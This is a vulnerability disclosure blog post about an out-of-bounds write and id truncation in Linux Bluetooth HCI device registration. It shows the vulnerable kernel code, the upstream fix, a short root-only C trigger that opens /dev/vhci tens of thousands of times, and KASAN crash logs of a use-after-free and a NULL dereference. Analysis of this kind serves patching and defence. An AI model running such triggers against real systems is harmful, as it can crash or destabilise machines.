---
layout: post
title:  "Finding bugs in the Linux Kernel Bluetooth Subsystem: Understanding HCI device id generation"
date:   2022-07-29 04:34:27 -0400
categories: linux
---
## Introduction

This blog post describes an (unexploitable, **yet**) out of bounds write bug in the HCI device id allocation mechanism in the Linux Kernel.


## HCI Sockets

The Host Controller Interface (HCI) socket mechanism provides a direct interface from user-space to the Bluetooth microcontroller via the local Bluetooth adapter. This interface is used for example to understand which Bluetooth adapters are present on your system. 

Here is an example `strace` log from `hciconfig`, a [BlueZ](http://www.bluez.org/) util, analogous to `ifconfig`, which displays local Bluetooth adapters:

```
socket(AF_BLUETOOTH, SOCK_RAW, BTPROTO_HCI) = 3
[...]
ioctl(3, HCIGETDEVLIST, 0x5573a94122a0) = 0
ioctl(3, HCIGETDEVINFO, 0x5573a81e0880) = 0
[...]
```

Which in turn, outputs:

```
hci0:	Type: Primary  Bus: USB
	BD Address: 5C:5F:67:99:3C:6A  ACL MTU: 8192:128  SCO MTU: 64:128
	DOWN 
	RX bytes:504 acl:0 sco:0 events:22 errors:0
	TX bytes:335 acl:0 sco:0 commands:22 errors:0
```

## The bug

The bug exists in `net/bluetooth/hci_core.c`:
```c
/* Register HCI device */
int hci_register_dev(struct hci_dev *hdev)
{
	int id, error;
	[...]
	switch (hdev->dev_type) {
	case HCI_PRIMARY:
		id = ida_simple_get(&hci_index_ida, 0, 0, GFP_KERNEL);
		break;
	case HCI_AMP:
		id = ida_simple_get(&hci_index_ida, 1, 0, GFP_KERNEL);
		break;
	[...]
	if (id < 0)
		return id;

	sprintf(hdev->name, "hci%d", id);
	hdev->id = id;

```
Where an out of bounds write occurs at `sprintf()` to `hdev->name` when the `id` local variable has a decimal notation which value is greater than 9999.

# Breakdown
The `id` local variable, is defined as an `int`, which would be 4 bytes in size on modern architectures. 
```c
int hci_register_dev(struct hci_dev *hdev)
{
	int id, error;
```


The `name` member of `hdev` however, is set up to 8 bytes in size:

```c
struct hci_dev {
	[...]
	char		name[8];
	__u16		id;
```
Where `ida_simple_get()`, which generates the id, has an upper bound of 2^31, because of the `id<0` test.

```c
	switch (hdev->dev_type) {
	case HCI_PRIMARY:
		id = ida_simple_get(&hci_index_ida, 0, 0, GFP_KERNEL);
		break;
	case HCI_AMP:
		id = ida_simple_get(&hci_index_ida, 1, 0, GFP_KERNEL);
		break;
```

This, in practice means that an id with value up to `(2^31)-1`, which translates to `2147483647` in decimal notation could be generated for HCI devices.

The `sprintf` function formats the `hci%d` formatted string into `hdev->name`. It is trivial to see that if `%d` would be greater than 9999, then an out of bounds write would occur.
```c
	sprintf(hdev->name, "hci%d", id);
```

Furthermore, when setting the local variable `id` to `hdev->id`, which is defined as a 2 bytes unsigned integer, an integer truncation would occur.
```c
	hdev->id = id;
```

## The fix

The [fix](https://github.com/torvalds/linux/commit/103a2f3255a95991252f8f13375c3a96a75011cd) seems trivial, simply set a maximum `HCI_MAX_ID` constant to `ida_simple_get()`, which would set an upper bound of 10000 to the id generation.

```c
[..]
-		id = ida_simple_get(&hci_index_ida, 0, 0, GFP_KERNEL);
+		id = ida_simple_get(&hci_index_ida, 0, HCI_MAX_ID, GFP_KERNEL);
		break;
	case HCI_AMP:
-		id = ida_simple_get(&hci_index_ida, 1, 0, GFP_KERNEL);
+		id = ida_simple_get(&hci_index_ida, 1, HCI_MAX_ID, GFP_KERNEL);
[...]
-	sprintf(hdev->name, "hci%d", id);
+	snprintf(hdev->name, sizeof(hdev->name), "hci%d", id);

```

## Exploitation

To exploit the out of bounds write bug, 10000 Bluetooth devices should be connected. To simulate this behaviour, I loaded the `hci_vhci.ko` kernel module to simulate a connection of multiple Bluetooth devices. Loading the driver exposed a character device named `/dev/vhci`, which is accessible from **root** permissions only.
To trigger the id truncation bug, I simulated a connection of 65537 `(2^16+1)` Bluetooth devices using the following code:

```c
#include <unistd.h>
#include <stdlib.h>
#include <fcntl.h>
#include <sys/resource.h>
#include <sys/time.h>

int main(){
        struct rlimit rlim;
        rlim.rlim_cur = 65537;
        rlim.rlim_max = 65537;
        setrlimit(RLIMIT_NOFILE, &rlim);

        for(int i = 0; i < 65537;i++){
                int fd = open("/dev/vhci", O_RDWR);
        }
}

```

I used the [setrlimit] system call to increase the maximum number of open file descriptors of the relevant exploit.

# Out of bounds write

The above scenario could lead to an out of bounds write, using the `HCIGETDEVINFO` ioctl handler (at `/net/bluetooth/hci_core.c`):
```c
int hci_get_dev_info(void __user *arg)
{
	struct hci_dev *hdev;
	struct hci_dev_info di;
	[...]
	if (copy_from_user(&di, arg, sizeof(di)))
		return -EFAULT;

	hdev = hci_dev_get(di.dev_id);
	[...]

	strcpy(di.name, hdev->name);
	di.bdaddr   = hdev->bdaddr;
	[...]
	if (copy_to_user(arg, &di, sizeof(di)))
		err = -EFAULT;

}
```
There no bounds checking and there is an **explicit** use of strcpy().

Where `struct hci_dev` includes the following member order:
```c
struct hci_dev_info {
	__u16 dev_id;
	char  name[8];

	bdaddr_t bdaddr;
	[...]
```
Given an `hdev->name` with an id value which is greater than 99999 in decimal notaion, any user-space tool that uses the `HCIGETDEVINFO` ioctl could be tricked into getting an incorrect Bluetooth device address.

Furthermore, the given HCI id would return the first id value set (modulo to 65536) `struct hci_dev`. For example, setting an ioctl with `HCIGETDEVINFO` of a  HCI device with id value of 65537 would return a `struct hci_dev` with id value of 1.


## Timeline
> 02/05/2022 - Bug reported to security@kernel.org
>
> 07/05/2022 - The [commit] was sent publicly, without disclosing any exploitation vectors or crash logs, as requested
>
> 11/05/2022 - The [commit] was merged upstream to all Linux Kernel stable versions

## Preview to the next part

In the next part I will describe several exploitation scenarios, including a use-after-free read and a NULL pointer dereference.
Attaching KASAN logs:

# Bug 1: Use-after-free read

>```
>[ 4294.772216] BUG: KASAN: use-after-free in kobject_put+0x31/0x460
>[ 4294.772219] Read of size 1 at addr ffff88828a734d24 by task
>openfd/2468
>
>[ 4294.772242] CPU: 3 PID: 2468 Comm: openfd Tainted: G        W   EL
>5.10.106 #1
>[ 4294.772243] Hardware name: VMware, Inc. VMware Virtual
>Platform/440BX Desktop Reference Platform, BIOS 6.00 07/22/2020
>[ 4294.772245] Call Trace:
>[ 4294.772250]  dump_stack+0x91/0xbc
>[ 4294.772253]  print_address_description.constprop.0+0x1c/0x210
>[ 4294.772256]  ? _raw_spin_lock_irqsave+0xa6/0x150
>[ 4294.772259]  ? slab_free_freelist_hook+0x6a/0x3f0
>[ 4294.772262]  ? _raw_write_unlock_bh+0x50/0x50
>[ 4294.772264]  ? kobject_put+0x16c/0x460
>[ 4294.772266]  ? kobject_put+0x31/0x460
>[ 4294.772268]  ? kobject_put+0x31/0x460
>[ 4294.772271]  kasan_report.cold+0x1f/0x37
>[ 4294.772273]  ? kobject_put+0x31/0x460
>[ 4294.772275]  kobject_put+0x31/0x460
>[ 4294.772280]  vhci_release+0x6b/0x110 [hci_vhci]
>[ 4294.772284]  __fput+0x18f/0x8d0
>[ 4294.772288]  task_work_run+0xea/0x1e0
>[ 4294.772290]  do_exit+0x915/0x2c20
>[ 4294.772293]  ? put_timespec64+0x9c/0x100
>[ 4294.772295]  ? mm_update_next_owner+0xa40/0xa40
>[ 4294.772298]  ? hrtimer_active+0x7c/0x1c0
>[ 4294.772300]  ? _raw_spin_lock_irq+0x96/0x130
>[ 4294.772303]  ? do_nanosleep+0x3c7/0x550
>[ 4294.772305]  do_group_exit+0x7d/0x320
>[ 4294.772307]  get_signal+0x34d/0x1f60
>[ 4294.772311]  arch_do_signal+0x88/0x26e0
>[ 4294.772314]  ? __hrtimer_init+0x230/0x230
>[ 4294.772316]  ? copy_siginfo_to_user32+0x80/0x80
>[ 4294.772318]  ? jiffies_to_timespec64+0x90/0x90
>[ 4294.772321]  ? common_nsleep+0x63/0x80
>[ 4294.772323]  ? __x64_sys_clock_nanosleep+0x224/0x390
>[ 4294.772326]  ? __ia32_sys_clock_adjtime+0x60/0x60
>[ 4294.772329]  exit_to_user_mode_prepare+0xd7/0x120
>[ 4294.772332]  syscall_exit_to_user_mode+0x28/0x140
>[ 4294.772334]  entry_SYSCALL_64_after_hwframe+0x44/0xa9
>[ 4294.772337] RIP: 0033:0x7f27a255fc0a
>[ 4294.772338] Code: Unable to access opcode bytes at RIP
>0x7f27a255fbe0.
>[ 4294.772340] RSP: 002b:00007ffcb54e9790 EFLAGS: 00000246 ORIG_RAX:
>00000000000000e6
>[ 4294.772343] RAX: fffffffffffffdfc RBX: ffffffffffffff80 RCX:
>00007f27a255fc0a
>[ 4294.772345] RDX: 00007ffcb54e97d0 RSI: 0000000000000000 RDI:
>0000000000000000
>[ 4294.772346] RBP: 0000000000000000 R08: 0000000000000000 R09:
>00007f27a268a1b0
>[ 4294.772348] R10: 00007ffcb54e97d0 R11: 0000000000000246 R12:
>000055607fcb20d0
>[ 4294.772350] R13: 0000000000000000 R14: 0000000000000000 R15:
>0000000000000000
>
>[ 4294.772354] Allocated by task 9921:
>[ 4294.772357]  kasan_save_stack+0x1b/0x40
>[ 4294.772359]  __kasan_kmalloc.constprop.0+0xc2/0xd0
>[ 4294.772388]  hci_alloc_dev+0x2b/0xda0 [bluetooth]
>[ 4294.772391]  __vhci_create_device+0xd4/0x580 [hci_vhci]
>[ 4294.772393]  vhci_open_timeout+0x40/0x80 [hci_vhci]
>[ 4294.772395]  process_one_work+0x51b/0x10f0
>[ 4294.772397]  worker_thread+0x493/0x13a0
>[ 4294.772399]  kthread+0x24b/0x330
>[ 4294.772402]  ret_from_fork+0x1f/0x30
>
>[ 4294.772404] Freed by task 2468:
>[ 4294.772407]  kasan_save_stack+0x1b/0x40
>[ 4294.772408]  kasan_set_track+0x1c/0x30
>[ 4294.772410]  kasan_set_free_info+0x1b/0x30
>[ 4294.772412]  __kasan_slab_free+0x110/0x150
>[ 4294.772414]  slab_free_freelist_hook+0x6a/0x3f0
>[ 4294.772417]  kfree+0xfc/0x910
>[ 4294.772445]  bt_host_release+0x4e/0x90 [bluetooth]
>[ 4294.772447]  device_release+0xf2/0x320
>[ 4294.772450]  kobject_put+0x154/0x460
>[ 4294.772452]  vhci_release+0x63/0x110 [hci_vhci]
>[ 4294.772454]  __fput+0x18f/0x8d0
>[ 4294.772456]  task_work_run+0xea/0x1e0
>[ 4294.772458]  do_exit+0x915/0x2c20
>[ 4294.772460]  do_group_exit+0x7d/0x320
>[ 4294.772462]  get_signal+0x34d/0x1f60
>[ 4294.772464]  arch_do_signal+0x88/0x26e0
>[ 4294.772467]  exit_to_user_mode_prepare+0xd7/0x120
>[ 4294.772469]  syscall_exit_to_user_mode+0x28/0x140
>[ 4294.772471]  entry_SYSCALL_64_after_hwframe+0x44/0xa9
>
>[ 4294.772474] The buggy address belongs to the object at
>ffff88828a734000
>                which belongs to the cache kmalloc-8k of size 8192
>[ 4294.772477] The buggy address is located 3364 bytes inside of
>                8192-byte region [ffff88828a734000, ffff88828a736000)
>[ 4294.772479] The buggy address belongs to the page:
>[ 4294.772483] page:00000000608c5702 refcount:1 mapcount:0
>mapping:0000000000000000 index:0x0 pfn:0x28a730
>[ 4294.772485] head:00000000608c5702 order:3 compound_mapcount:0
>compound_pincount:0
>[ 4294.772487] flags: 0x17ffffc0010200(slab|head)
>[ 4294.772490] raw: 0017ffffc0010200 dead000000000100 dead000000000122
>ffff88810004ee40
>[ 4294.772493] raw: 0000000000000000 0000000000020002 00000001ffffffff
>0000000000000000
>[ 4294.772494] page dumped because: kasan: bad access detected
>
>[ 4294.772496] Memory state around the buggy address:
>[ 4294.772522]  ffff88828a734c00: fb fb fb fb fb fb fb fb fb fb fb fb
>fb fb fb fb
>[ 4294.772524]  ffff88828a734c80: fb fb fb fb fb fb fb fb fb fb fb fb
>fb fb fb fb
>[ 4294.772526] >ffff88828a734d00: fb fb fb fb fb fb fb fb fb fb fb fb
>fb fb fb fb
>[ 4294.772528]                                ^
>[ 4294.772531]  ffff88828a734d80: fb fb fb fb fb fb fb fb fb fb fb fb
>fb fb fb fb
>[ 4294.772533]  ffff88828a734e00: fb fb fb fb fb fb fb fb fb fb fb fb
>fb fb fb fb
>[ 4294.772535]
>==================================================================
>[ 4294.772537] Disabling lock debugging due to kernel taint
>[ 4294.772538] ------------[ cut here ]------------
>[ 4294.772539] refcount_t: underflow; use-after-free.
>[ 4294.772541]
>=======================================================================
>```

# Bug #2: NULL pointer dereference

>```
>[ 4348.819535] BUG: kernel NULL pointer dereference, address:
>0000000000000078
>[ 4348.819541] #PF: supervisor read access in kernel mode
>[ 4348.819543] #PF: error_code(0x0000) - not-present page
>[ 4348.819546] PGD 0 P4D 0
>[ 4348.819551] Oops: 0000 [#1] SMP KASAN NOPTI
>[ 4348.819555] CPU: 9 PID: 2468 Comm: openfd Tainted: G    B   W   EL
>5.10.106 #1
>[ 4348.819557] Hardware name: VMware, Inc. VMware Virtual
>Platform/440BX Desktop Reference Platform, BIOS 6.00 07/22/2020
>[ 4348.819562] RIP: 0010:ida_free+0x17e/0x350
>[ 4348.819566] Code: b5 d1 00 eb 61 a8 07 0f 85 d4 01 00 00 4c 89 f8 be
>08 00 00 00 48 c1 f8 06 4c 8d 44 c5 00 4c 89 c7 4c 89 04 24 e8 42 4f 90
>ff <4c> 0f a3 7d 00 72 79 48 8b 6c 24 40 40 f6 c5 07 0f 85 61 01 00 00
>[ 4348.819568] RSP: 0018:ffff8881428c7980 EFLAGS: 00010002
>[ 4348.819572] RAX: 0000000000000001 RBX: 1ffff11028518f32 RCX:
>ffffffffacb1235e
>[ 4348.819574] RDX: 0000000000000000 RSI: 0000000000000008 RDI:
>0000000000000078
>[ 4348.819576] RBP: 0000000000000000 R08: 0000000000000000 R09:
>0000000000000080
>[ 4348.819578] R10: ffffed1028518f24 R11: 0000000000000001 R12:
>0000000000000246
>[ 4348.819580] R13: ffff8881428c79c0 R14: 00000000000083fe R15:
>00000000000003fe
>[ 4348.819583] FS:  0000000000000000(0000) GS:ffff888568080000(0000)
>knlGS:0000000000000000
>[ 4348.819585] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
>[ 4348.819588] CR2: 0000000000000078 CR3: 00000002cb47c002 CR4:
>00000000007706e0
>[ 4348.819593] PKRU: 55555554
>[ 4348.819595] Call Trace:
>[ 4348.819600]  ? ida_destroy+0x2f0/0x2f0
>[ 4348.819632]  ? hci_adv_instances_clear+0x1df/0x3d0 [bluetooth]
>[ 4348.819660]  ? hci_cleanup_dev+0x5d7/0xbe0 [bluetooth]
>[ 4348.819689]  ? bt_link_release+0x20/0x20 [bluetooth]
>[ 4348.819718]  bt_host_release+0x66/0x90 [bluetooth]
>[ 4348.819723]  device_release+0xf2/0x320
>[ 4348.819726]  kobject_put+0x154/0x460
>[ 4348.819731]  vhci_release+0x6b/0x110 [hci_vhci]
>[ 4348.819735]  __fput+0x18f/0x8d0
>[ 4348.819739]  task_work_run+0xea/0x1e0
>[ 4348.819742]  do_exit+0x915/0x2c20
>[ 4348.819746]  ? put_timespec64+0x9c/0x100
>[ 4348.819749]  ? mm_update_next_owner+0xa40/0xa40
>[ 4348.819752]  ? hrtimer_active+0x7c/0x1c0
>[ 4348.819756]  ? _raw_spin_lock_irq+0x96/0x130
>[ 4348.819759]  ? do_nanosleep+0x3c7/0x550
>[ 4348.819762]  do_group_exit+0x7d/0x320
>[ 4348.819765]  get_signal+0x34d/0x1f60
>[ 4348.819769]  arch_do_signal+0x88/0x26e0
>[ 4348.819772]  ? __hrtimer_init+0x230/0x230
>[ 4348.819775]  ? copy_siginfo_to_user32+0x80/0x80
>[ 4348.819778]  ? jiffies_to_timespec64+0x90/0x90
>[ 4348.819781]  ? common_nsleep+0x63/0x80
>[ 4348.819784]  ? __x64_sys_clock_nanosleep+0x224/0x390
>[ 4348.819787]  ? __ia32_sys_clock_adjtime+0x60/0x60
>[ 4348.819791]  exit_to_user_mode_prepare+0xd7/0x120
>[ 4348.819795]  syscall_exit_to_user_mode+0x28/0x140
>[ 4348.819798]  entry_SYSCALL_64_after_hwframe+0x44/0xa9
>[ 4348.819801] RIP: 0033:0x7f27a255fc0a
>[ 4348.819803] Code: Unable to access opcode bytes at RIP
>0x7f27a255fbe0.
>[ 4348.819805] RSP: 002b:00007ffcb54e9790 EFLAGS: 00000246 ORIG_RAX:
>00000000000000e6
>[ 4348.819809] RAX: fffffffffffffdfc RBX: ffffffffffffff80 RCX:
>00007f27a255fc0a
>[ 4348.819811] RDX: 00007ffcb54e97d0 RSI: 0000000000000000 RDI:
>0000000000000000
>[ 4348.819813] RBP: 0000000000000000 R08: 0000000000000000 R09:
>00007f27a268a1b0
>[ 4348.819815] R10: 00007ffcb54e97d0 R11: 0000000000000246 R12:
>000055607fcb20d0
>[ 4348.819818] R13: 0000000000000000 R14: 0000000000000000 R15:
>0000000000000000
>[ 4348.819820] Modules linked in: hci_vhci(E) uinput(E) rfcomm(E)
>bnep(E) btusb(E) btrtl(E) btbcm(E) btintel(E) bluetooth(E)
>jitterentropy_rng(E) vsock_loopback(E) drbg(E)
>vmw_vsock_virtio_transport_common(E) intel_rapl_msr(E)
>intel_rapl_common(E) intel_pmc_core_pltdrv(E) snd_ens1371(E)
>vmw_vsock_vmci_transport(E) intel_pmc_core(E) vsock(E)
>ghash_clmulni_intel(E) aes_generic(E) snd_ac97_codec(E) ac97_bus(E)
>aesni_intel(E) gameport(E) crypto_simd(E) snd_rawmidi(E) cryptd(E)
>ansi_cprng(E) snd_seq_device(E) glue_helper(E) snd_pcm(E) rapl(E)
>ecdh_generic(E) snd_timer(E) rfkill(E) ecc(E) snd(E) libaes(E)
>soundcore(E) vmw_balloon(E) joydev(E) sg(E) serio_raw(E) pcspkr(E)
>vmw_vmci(E) evdev(E) ac(E) msr(E) parport_pc(E) ppdev(E) lp(E)
>parport(E) fuse(E) configfs(E) ip_tables(E) x_tables(E) autofs4(E)
>ext4(E) crc16(E) mbcache(E) jbd2(E) btrfs(E) blake2b_generic(E)
>raid10(E) raid456(E) async_raid6_recov(E) async_memcpy(E) async_pq(E)
>async_xor(E) async_tx(E) xor(E) raid6_pq(E) libcrc32c(E)
>[ 4348.819904]  crc32c_generic(E) raid1(E) raid0(E) multipath(E)
>linear(E) md_mod(E) hid_generic(E) usbhid(E) hid(E) sd_mod(E) t10_pi(E)
>crc_t10dif(E) crct10dif_generic(E) vmwgfx(E) sr_mod(E) cdrom(E) ttm(E)
>ata_generic(E) uhci_hcd(E) ehci_pci(E) drm_kms_helper(E) mptspi(E)
>ata_piix(E) crct10dif_pclmul(E) ehci_hcd(E) crct10dif_common(E) cec(E)
>mptscsih(E) crc32_pclmul(E) crc32c_intel(E) psmouse(E) mptbase(E)
>libata(E) usbcore(E) scsi_transport_spi(E) drm(E) e1000(E) scsi_mod(E)
>usb_common(E) i2c_piix4(E) button(E)
>[ 4348.820013] CR2: 0000000000000078
>[ 4348.820016] ---[ end trace 8dfc2a7c580dec5a ]---
>[ 4348.820021] RIP: 0010:ida_free+0x17e/0x350
>[ 4348.820024] Code: b5 d1 00 eb 61 a8 07 0f 85 d4 01 00 00 4c 89 f8 be
>08 00 00 00 48 c1 f8 06 4c 8d 44 c5 00 4c 89 c7 4c 89 04 24 e8 42 4f 90
>ff <4c> 0f a3 7d 00 72 79 48 8b 6c 24 40 40 f6 c5 07 0f 85 61 01 00 00
>[ 4348.820026] RSP: 0018:ffff8881428c7980 EFLAGS: 00010002
>[ 4348.820029] RAX: 0000000000000001 RBX: 1ffff11028518f32 RCX:
>ffffffffacb1235e
>[ 4348.820031] RDX: 0000000000000000 RSI: 0000000000000008 RDI:
>0000000000000078
>[ 4348.820033] RBP: 0000000000000000 R08: 0000000000000000 R09:
>0000000000000080
>[ 4348.820035] R10: ffffed1028518f24 R11: 0000000000000001 R12:
>0000000000000246
>[ 4348.820038] R13: ffff8881428c79c0 R14: 00000000000083fe R15:
>00000000000003fe
>[ 4348.820040] FS:  0000000000000000(0000) GS:ffff888568080000(0000)
>knlGS:0000000000000000
>[ 4348.820042] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
>[ 4348.820045] CR2: 0000000000000078 CR3: 00000002cb47c002 CR4:
>00000000007706e0
>[ 4348.820065] PKRU: 55555554
>[ 4348.820067] Fixing recursive fault but reboot is needed!
>```

[commit]: https://github.com/torvalds/linux/commit/103a2f3255a95991252f8f13375c3a96a75011cd
[setrlimit]: https://linux.die.net/man/2/setrlimit 
